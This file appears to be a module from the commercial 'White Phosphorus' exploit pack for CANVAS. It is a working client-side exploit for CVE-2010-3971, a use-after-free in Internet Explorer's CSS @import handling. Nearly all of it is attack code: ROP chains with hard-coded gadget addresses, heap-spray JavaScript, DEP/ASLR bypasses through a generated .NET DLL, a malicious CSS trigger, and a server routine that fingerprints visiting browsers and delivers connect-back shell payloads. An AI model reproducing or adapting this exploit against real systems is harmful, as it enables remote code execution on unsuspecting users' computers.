
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

from pelib import PElib


######################################################################################
NAME = "IE CSS Import Use After Free"
DESCRIPTION = "IE CSS Import Use After Free Code Execution Vulnerability"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2010-12-08"
DOCUMENTATION["References"] = """http://seclists.org/fulldisclosure/2010/Dec/110
http://www.microsoft.com/technet/security/bulletin/MS11-003.mspx"""
DOCUMENTATION['CVE'] = "CVE-2010-3971"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3971'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["Repeatability"] = "Unlimited"   
DOCUMENTATION['VersionsAffected']='Windows XP/Vista/7, IE Versions 7/8'                           
DOCUMENTATION["Notes"] = """
This is a client-side exploit - USE THIS MODULE VIA HTTPSERVER

If you choose to host the exploit file on an independandant webserver, then you must include the genreated .css and .dll files as well.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]
PROPERTY['MSADV'] = 'MS11-003'
PROPERTY['DELIVERY'] = 'HTTP'



NOTES="""
This is a client-side exploit - USE THIS MODULE VIA HTTPSERVER
If you choose to host the exploit file on an independandant webserver, then you must include the genreated .css and .dll files as well.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> IE CSS Import Use After Free
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ms11_003_ie_css_import/wp_ms11_003_ie_css_import.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP Universal", (0x00000000), [WINALL]],
    1 : ["Windows Vista IE7", (0x00000000), [WINALL]],
    2 : ["Windows 7/Vista IE8", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]
    
    # Clienside exploits default to HTTPMosdef PLAIN for clientD
    DEFAULT_PAYLOAD = 2

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        # We default these to false        
        self.HTTPMOSDEF = False
        self.useSSLMOSDEF = False
        self.isClientD=False
                                
        self.badstring=''   # Shellcode is on heap or in dll
        
        #Ranomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"          
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        
        # For IE7 .Net Shellcode
        self.vProtect = True
        self.pc = 0x44444444;
        
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, if recon modules are enabled
        # returns a value used to rank the exploit within attacking modules
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] # it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        #self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:
            # Potentially called from httpserver update shellcode accordingly        
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
 
    def makefileIE8_VistaWin7_part1(self):
        # Exploit for IE 8 Windows 7/Vista
        # This page loads a .Net DLL
        # mscorie .Net DLL ASLR/DEP Bypass
   
        filedata = """
<html>
<object classid="OURDLL" height="0" width="0"></object>
<iframe src=/page2.htm></iframe>             
</html>
"""
        filedata = filedata.replace('OURDLL', self.filename.replace('.html','.dll'))
        return filedata
 
    def makefileIE8_VistaWin7_part2(self):
        # Exploit for IE 8 Windows 7/Vista
        landingAddress = 0x126A1000 #0x126A1000

        heapspraycode = pack('<L', 0x63F05761)          #the slide of RETN
        heapspraycode += pack('<L', landingAddress+8)   # MOV EAX,DWORD PTR DS:[ECX]
        heapspraycode += pack('<L', 0x63F0575B)         # MSCORIE:(0x63f0575b XCHG EAX,ESP)
        heapspraycode += pack('<L', landingAddress)     #  JUNKED
        heapspraycode += pack('<L', 0x63F03E9B)         # RETN 30
        heapspraycode += pack('<L', 0x63F057D3)         # RETN 0C
        heapspraycode += pack('<L', 0x00000001)         # required byte
        heapspraycode += pack('<L', 0x63F03E9B)         # RETN 30 
        heapspraycode += pack('<L', landingAddress)  
        heapspraycode += pack('<L', landingAddress+4)   # MOV ECX,DWORD PTR DS:[ECX+20]
        heapspraycode += pack('<L', 0x63F0237E)         # MOV EDX,DWORD PTR DS:[EAX+20] 63F0237E  MSCOREIE: CALL DWORD PTR DS:[ECX+4]  
        heapspraycode += pack('<L', 0x63F03E9B) * 10    # RETN 30
        heapspraycode += pack('<L', 0x00000001)         # required byte
        while len(heapspraycode) < (0x100-4):
            heapspraycode += pack('<L', 0x63F05761)     #  RETN
        heapspraycode += pack('<L', 0x63F03E9B)         #  RETN 30

        depbypass = pack('<L', 0x63F05761)  # RETN
        depbypass += pack('<L', 0x11111111) * 0x0C  # Slackspace
                
        # depbypass using mscorie
        # Clever trick using PUSHAD to get the current ESP location into the params
        # 
        depbypass += pack('<L', 0x63f05428)  # POP EDI, ESI, RET
        depbypass += pack('<L', 0x63f05b01)  # RETN
        depbypass += pack('<L', 0x63f05b01)  # RETN
        depbypass += pack('<L', 0x63f05557)  # POP EBP
        depbypass += pack('<L', 0x63f04cb5)  # Call VirtualAlloc 
        depbypass += pack('<L', 0x63f054c0)  # POP EBX
        depbypass += pack('<L', 0x000007d0)  # Size
        depbypass += pack('<L', 0x63f05458)  # POP EDX
        depbypass += pack('<L', 0x00001000)  # Type
        depbypass += pack('<L', 0x63f01e13)  # POP ECX
        depbypass += pack('<L', 0x00000040)  # Protect
        depbypass += pack('<L', 0x63f05afa)  # PUSHAD, XOR EAX,C9027563, RET
        depbypass += pack('<L', 0x63f069e3)  # CALL ESP
        depbypass += pack('<L', 0x11111111)  # slackspace
        depbypass += pack('<L', 0x11111111)  # slackspace
        depbypass += pack('<L', 0x11111111)  # slackspace
        depbypass += pack('<L', 0x11111111)  # slackspace
        depbypass += pack('<L', 0x11111111)  # slackspace
      
        filedata = """
        
<html>
<script language="JavaScript">
"""
        #script code

        script = """

   
memory = new Array();
shellcode =  unescape("SHELLCODE");
//var len= shellcode.length + 0x21; //0x21 is heap header
var len=0

var heapspray = unescape("HEAPSPRAYCODE");         

while(heapspray.length < 0x120000) heapspray += heapspray; 
heapspray = heapspray.substring(0, 0x120000- len); 

prefix = unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 

heapspray = prefix + heapspray; 
heapspray += unescape("DEPBYPASSCODE") + shellcode;

try{ 
for(var i = 0; i < 400; i++) { 
  memory[i]= heapspray.substring(0,heapspray.length); 
}   
}
catch(err)
{}

"""
        script = script.replace('SHELLCODE',wp_urluencode(wp_randomnops(4) + self.shellcode + ("\x00" * 100)))
        script = script.replace('HEAPSPRAYCODE',wp_urluencode(heapspraycode))
        script = script.replace('DEPBYPASSCODE',wp_urluencode(depbypass))
        
        #Obfuscate the script code (not used)
        filedata += script
        
        # Add the reset of the filedata
        filedata+=""" 
</SCRIPT>               
<div style="position: absolute; top: -999px;left: -999px;">
<link href="css4.css" rel="stylesheet" type="text/css" />
</html>
"""
        return filedata
        
    def makefileWinXP(self,browser):
        # Exploit for Windows XP (DEP Bypass)
        landingAddress = 0x126A1000 #0x126A1000
                
        # Build our heapspray repeated block to get to this vtable jmp
        # 4384F78D   8B46 5C          MOV EAX,DWORD PTR DS:[ESI+5C]
        #
        #43681BE1   8B49 20          MOV ECX,DWORD PTR DS:[ECX+20]
        #43681BE4   8B01             MOV EAX,DWORD PTR DS:[ECX]
        #43681BE6   8B50 20          MOV EDX,DWORD PTR DS:[EAX+20]
        #43681BE9  -FFE2             JMP EDX

        if browser == "MSIE 8.0":
            heapspraycode = pack('<L', 0x77C21A57)          #the slide of RETN
            heapspraycode += pack('<L', landingAddress+8)   # MOV EAX,DWORD PTR DS:[ECX]
            heapspraycode += pack('<L', 0x77C3335C)         #  FIRST STACK PTR (RETN 80) 
            heapspraycode += pack('<L', 0x77C21A57)         #  Start the slide of RETN
            heapspraycode += pack('<L', landingAddress)  
            heapspraycode += pack('<L', landingAddress)  
            heapspraycode += pack('<L', 0x00000001)         # required byte
            heapspraycode += pack('<L', 0x126A10FF)         # To pass the TEST AL,AL
            heapspraycode += pack('<L', landingAddress)  
            heapspraycode += pack('<L', landingAddress+4)   # MOV ECX,DWORD PTR DS:[ECX+20]
            heapspraycode += pack('<L', 0x77C15ED5)         # MOV EDX,DWORD PTR DS:[EAX+20] JMP EDX   (77C15ED5 XCHG EAX,ESP)
            heapspraycode += pack('<L', landingAddress) * 10  
            heapspraycode += pack('<L', 0x00000001)         # required byte
            while len(heapspraycode) < (0x100-4):
                heapspraycode += pack('<L', 0x77C21A57)     #  77C11110 RETN
            heapspraycode += pack('<L', 0x77C3335C)         #  RETN 80
        else:
            heapspraycode = pack('<L', 0x77C21A57)          #the slide of RETN
            heapspraycode += pack('<L', landingAddress+8)   # MOV EAX,DWORD PTR DS:[ECX]
            heapspraycode += pack('<L', 0x77C3335C)         #  FIRST STACK PTR (RETN 80) 
            heapspraycode += pack('<L', 0x77C21A57)         #  Start the slide of RETN
            heapspraycode += pack('<L', landingAddress)  
            heapspraycode += pack('<L', 0x00000001)         # required byte
            heapspraycode += pack('<L', 0x126A10FF)         #    To pass the TEST AL,AL
            heapspraycode += pack('<L', landingAddress)  
            heapspraycode += pack('<L', landingAddress+4)   # MOV ECX,DWORD PTR DS:[ECX+20]
            heapspraycode += pack('<L', landingAddress)  
            heapspraycode += pack('<L', 0x77C15ED5)         # MOV EDX,DWORD PTR DS:[EAX+20] JMP EDX   (77C15ED5 XCHG EAX,ESP)
            while len(heapspraycode) < (0x100-4):
                heapspraycode += pack('<L', 0x77C21A57)     #  77C11110 RETN
            heapspraycode += pack('<L', 0x77C3335C)         #  RETN 80
      
        depbypass = pack('<L', 0x77C21A57)  # RETN
        depbypass += pack('<L', 0x11111111) * 0x20  # Slackspace
        depbypass += self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8) 
            
      
        filedata = """
        
<html>
<script language="JavaScript">
"""
        #script code

        script = """

   
memory = new Array();
shellcode =  unescape("SHELLCODE");
//var len= shellcode.length + 0x21; //0x21 is heap header
var len=0

var heapspray = unescape("HEAPSPRAYCODE");         

while(heapspray.length < 0x120000) heapspray += heapspray; 
heapspray = heapspray.substring(0, 0x120000- len); 

prefix = unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 

heapspray = prefix + heapspray; 
heapspray += unescape("DEPBYPASSCODE") + shellcode;

try{ 
for(var i = 0; i < 400; i++) { 
  memory[i]= heapspray.substring(0,heapspray.length); 
}   
}
catch(err)
{}

"""
        script = script.replace('SHELLCODE',wp_urluencode(wp_randomnops(4) + self.shellcode + ("\x00" * 100)))
        script = script.replace('HEAPSPRAYCODE',wp_urluencode(heapspraycode))
        script = script.replace('DEPBYPASSCODE',wp_urluencode(depbypass))
        
        #Obfuscate the script code (not used)
        filedata += script
        
        # Add the reset of the filedata
        filedata+=""" 
</SCRIPT>               
<div style="position: absolute; top: -999px;left: -999px;">
<link href="css4.css" rel="stylesheet" type="text/css" />
</html>
"""
        return filedata        
        
    def makefileIE7_part1(self):
        # Exploit for Windows Vista IE 7
        # This page loads the .Net DLL
        # .Net DLL ASLR/DEP Bypass
   
        filedata = """
        
<html>
<object classid="OURDLL#exploit.Shellcode" height="0" width="0"></object>

<iframe src=/page2.htm></iframe>             

</html>
"""
        filedata = filedata.replace('OURDLL', self.filename.replace('.html','.dll'))
        return filedata
        
    def makefileIE7_part2(self):
        # Exploit for Windows Vista IE 7
        # This part returns the created .net dll
        # .Net DLL ASLR/DEP Bypass
        
        p = PElib()
        filedata = p.createDotNETPEFileBuf(self.createShellcode(), self.pc)
        return filedata        
        
    def makefileIE7_part3(self):
        # Exploit for Windows Vista IE 7
        # This part triggers the exploit
        # .Net DLL ASLR/DEP Bypass
   
        landingAddress = 0x126A1000 #0x126A1000
                
        # Build our heapspray repeated block to get to this vtable jmp
        # 4384F78D   8B46 5C          MOV EAX,DWORD PTR DS:[ESI+5C]
        #
        #43681BE1   8B49 20          MOV ECX,DWORD PTR DS:[ECX+20]
        #43681BE4   8B01             MOV EAX,DWORD PTR DS:[ECX]
        #43681BE6   8B50 20          MOV EDX,DWORD PTR DS:[EAX+20]
        #43681BE9  -FFE2             JMP EDX

        heapspraycode = pack('<L', 0x77C21A57)          #the slide of RETN
        heapspraycode += pack('<L', landingAddress+8)   # MOV EAX,DWORD PTR DS:[ECX]
        heapspraycode += pack('<L', landingAddress)         #  FIRST STACK PTR (RETN 80) 
        heapspraycode += pack('<L', landingAddress)         #  Start the slide of RETN
        heapspraycode += pack('<L', landingAddress)  
        heapspraycode += pack('<L', 0x00000001)         # required byte
        heapspraycode += pack('<L', 0x126A10FF)         #    To pass the TEST AL,AL
        heapspraycode += pack('<L', landingAddress)  
        heapspraycode += pack('<L', landingAddress+4)   # MOV ECX,DWORD PTR DS:[ECX+20]
        heapspraycode += pack('<L', landingAddress)  
        heapspraycode += pack('<L', self.pc)         # MOV EDX,DWORD PTR DS:[EAX+20] JMP EDX   (77C15ED5 XCHG EAX,ESP)
        while len(heapspraycode) < (0x100):
            heapspraycode += pack('<L', landingAddress)     #  Buffer
        
      
        filedata = """
        
<html>
<script language="JavaScript">
"""
        #script code

        script = """

   
memory = new Array();
shellcode =  unescape("SHELLCODE");
//var len= shellcode.length + 0x21; //0x21 is heap header
var len=0

var heapspray = unescape("HEAPSPRAYCODE");         

while(heapspray.length < 0x120000) heapspray += heapspray; 
heapspray = heapspray.substring(0, 0x120000- len); 

prefix = unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 

heapspray = prefix + heapspray; 

try{ 
for(var i = 0; i < 400; i++) { 
  memory[i]= heapspray.substring(0,heapspray.length); 
}   
}
catch(err)
{}

"""
        script = script.replace('HEAPSPRAYCODE',wp_urluencode(heapspraycode))
        
        #Obfuscate the script code (not used)
        filedata += script
        
        # Add the reset of the filedata
        filedata+=""" 
</SCRIPT>               
<div style="position: absolute; top: -999px;left: -999px;">
<link href="css4.css" rel="stylesheet" type="text/css" />
</html>
"""
        return filedata        

    def makefile(self,browser,osversion):       

        if osversion == "Windows XP":
            self.log('WP> Serving Windows XP exploit')
            return self.makefileWinXP(browser)
        if browser == "MSIE 8.0":
            self.log('WP> Serving MSIE 8.0 exploit')
            return self.makefileIE8_VistaWin7_part1()
        if browser == "MSIE 7.0":
            self.log('WP> Serving MSIE 7.0 exploit')
            return self.makefileIE7_part1()   
                     
        # Default to a non ASLR version          
        self.log('WP> Serving Non ASLR Exploit')     
        return self.makefileWinXP(browser)
        
    def makecssfile(self,browser,osversion):       
        #0x126A10C0
        address = u"\u1000\u126a"

        filedata = "\xef\xbb\xbf"       # UTF-8 Header Bytes
        filedata += """*{
 color:red;
 color:blue;
}

@import url("\x01\x01ADDRESS");
@import url("css4.css");
@import url("css4.css");
@import url("css4.css");""".replace("ADDRESS",address.encode('utf-8'))            
            
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        cookies = clientheader.getStrValue(['Cookie'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')        
        
        #self.log('WP> User agent of connecting host: %s' % user_agent)        
        #self.log('WP> Cookies of connecting host: %s' % cookies)
                
        if clientheader.URL.count(self.filename):
            if cookies.count("SessionID"):
                self.log('WP> Exploit already sent to this client')
                self.log('WP> Returning blank page')
                data=""
                b.setBody(data)
                h.addHeader('Content-Type','text/html')
            else:
                self.log('WP> Serving exploit html file')
    
                data=self.makefile(browser,osversion)
                if not data:
                    return None,None
                b.setBody(data)
                h.addHeader('Content-Type','text/html')
                h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
            
        elif (clientheader.URL.count('.dll')):
            if browser == "MSIE 7.0":
                self.log('WP> Serving IE7 .Net DLL file')
                data = self.makefileIE7_part2()

                if not data:
                    return None,None
                b.setBody(data)
                h.addHeader('Content-Type','application/octet-stream')
                                
            else:
                self.log('WP> Serving IE8 .Net DLL file')
                data=open('3rdparty/White_Phosphorus/exploits/wp_quicktime_punk/ourdll.dll').read()
                
                if not data:
                    return None,None
                b.setBody(data)
                h.addHeader('Content-Type','application/octet-stream')
        elif (clientheader.URL.count('page2.htm')):
            if cookies.count("SessionID2"):
                self.log('WP> Exploit already sent to this client')
                self.log('WP> Returning blank page')
                data=""
                b.setBody(data)
                h.addHeader('Content-Type','text/html')
            else:        
                self.log('WP> Serving exploit secondary file')
                if browser == "MSIE 7.0":
                    data=self.makefileIE7_part3()
                else:
                    data=self.makefileIE8_VistaWin7_part2()
                if not data:
                    return None,None
                b.setBody(data)
                h.addHeader('Content-Type','text/html')    
                h.addHeader('Set-Cookie','SessionID2=%d' % self.jsObfuscator.getXORKey())     
         
        elif (clientheader.URL.count('.css')):
            self.log('WP> Serving exploit css file')

            data=self.makecssfile(browser,osversion)
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        self.log('WP> ****************************************')
        return h,b

    def run(self):

        if (self.version == 0):
            filedata=self.makefile('','Windows XP')
        elif (self.version ==1):
            filedata=self.makefile('MSIE 7','')
        elif (self.version ==2):
            filedata=self.makefile('MSIE 8','')
                    
        
        self.log("WP> Opening %s"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        
        self.log('WP> Wrote to %s'%(self.filename))
        
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
